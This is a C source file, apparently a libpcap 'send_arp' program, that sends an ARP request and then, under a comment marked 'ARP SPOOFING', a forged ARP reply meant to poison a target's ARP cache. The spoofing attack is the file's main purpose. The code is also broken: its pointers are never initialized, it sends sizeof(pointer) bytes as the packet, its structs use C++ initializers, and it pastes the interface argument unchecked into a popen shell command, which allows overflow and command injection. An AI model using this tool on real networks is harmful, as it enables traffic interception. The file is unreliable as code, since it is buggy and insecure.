#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <net/ethernet.h>

#define REQUEST 0x0001
#define REPLY 0x0002

struct eth_header {
	uint8_t dest_mac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	uint8_t src_mac[6];
	uint16_t type = 0x0806;
};

struct arp_packet {
	uint16_t hw_type = 0x0001;
	uint16_t protocol = 0x0800;
	uint8_t hw_addr_len = 0x06;
	uint8_t protocol_addr_len = 0x04;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint32_t sender_ip;
	uint8_t target_mac[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	uint32_t target_ip;
};

int getSourceMac(char* interface, uint8_t* res) {
	FILE *fp;
	char my_mac[18];
	char cmd1[128] = "ip link show ";
	char *cmd2 = " | grep ether | awk '{print $2}'";

	strcat(cmd1, interface);
	strcat(cmd1, cmd2);
	printf("Command:%s\n",cmd1);
	fp = popen(cmd1, "r");
	if (NULL == fgets(my_mac, sizeof(my_mac), fp)) {
		return -1;
	}
	printf("MAC %s\n", my_mac);

	for (int i=0, j=0; i < 18 && j < 6; i++,j++) {
		uint8_t tmp1, tmp2;
		if (my_mac[i] >= 'a' && my_mac[i] <= 'f') 
			tmp1 = my_mac[i]-'a'+10;
		else if (my_mac[i] >= '0' && my_mac[i] <= '9')
			tmp1 = my_mac[i]-'0';
		else tmp1 = 0;
		i++;
		if (my_mac[i] >= 'a' && my_mac[i] <= 'f')
			tmp2 = my_mac[i]-'a'+10;
		else if (my_mac[i] >= '0' && my_mac[i] <= '9')
			tmp2 = my_mac[i]-'0'+0;
		else tmp2 = 0;
		i++;
		res[j] = (tmp1 << 4) | tmp2;
		printf("res[%d]=%2x\n", j, res[j]);
	}
	printf("RES ");
	for (int i=0; i < 5; i++) printf("%02x: ", res[i]);
	printf("%02x\n", res[5]);
	return 0;
}

uint32_t my_inet_aton(char* strIP) {
	// ip string --> uint32_t ip addr
	uint32_t tmp[4] = { 0, 0, 0, 0 };
	for (int i=strlen(strIP)-1, cipher=1, j=0; i >= 0; i--) {
		if (strIP[i] == '.') {
			cipher = 1;
			j++;
			continue;
		}
		tmp[j] += (strIP[i]-'0')*cipher;
		cipher *= 10;
	}
	tmp[1] <<= 8;
	tmp[2] <<= 16;
	tmp[3] <<= 24;
	return (tmp[0] | tmp[1] | tmp[2] | tmp[3]);
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		printf("Usage: ./send_arp <interface> <sender ip> <target ip>\n");
		return -1;
	}
	struct eth_header *eth_hdr;
	struct arp_packet *arp_pk;
	
	uint32_t sip = my_inet_aton(argv[2]);
	uint32_t dip = my_inet_aton(argv[3]);
	uint8_t smac[6], dmac[6];
	if (getSourceMac(argv[1], smac) == -1) {
		return -1;
	}

	// 1) ARP REQUEST
	for (int i=0; i<6; i++) eth_hdr->src_mac[i] = smac[i];
	arp_pk->opcode = REQUEST;
	for (int i=0; i<6; i++) arp_pk->sender_mac[i] = smac[i];
	arp_pk->sender_ip = sip;
	arp_pk->target_ip = dip;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	printf("ARP PACKET SIZE: %d\n", sizeof(arp_pk));
	pcap_sendpacket(handle, (const u_char*)arp_pk, sizeof(arp_pk));

	struct pcap_pkthdr *header;
	const u_char* packet;
	int res = pcap_next_ex(handle, &header, &packet);
	if (res <= 0) return -1;
	eth_hdr = (struct eth_header*) packet;
	arp_pk = (struct arp_packet*) (packet + 14);

	if (eth_hdr->type == 0x0806) {
		if (arp_pk->protocol == 0x0800) {
			if (arp_pk->opcode == REPLY && arp_pk->target_ip == sip) {
				printf("Get ARP Reply packet!\n");
				printf("TARGET MAC  ");
				for(int i=0; i<5; i++) printf("%02x: ", eth_hdr->dest_mac[i]);
				printf("%02x\n", eth_hdr->dest_mac[5]);
			}
		}
	}

	// 2) ARP SPOOFING
	arp_pk->opcode = REPLY;
	for (int i=0; i<6; i++) arp_pk->sender_mac[i] = 0x11;
	arp_pk->sender_ip = sip;
	for (int i=0; i<6; i++) arp_pk->target_mac[i] = eth_hdr->dest_mac[i];
	pcap_sendpacket(handle, (const u_char*)arp_pk, sizeof(arp_pk));
	printf("---------------------------------------------------------\nSEND PACKET\n");
	
	pcap_close(handle);
	return 0; 
}
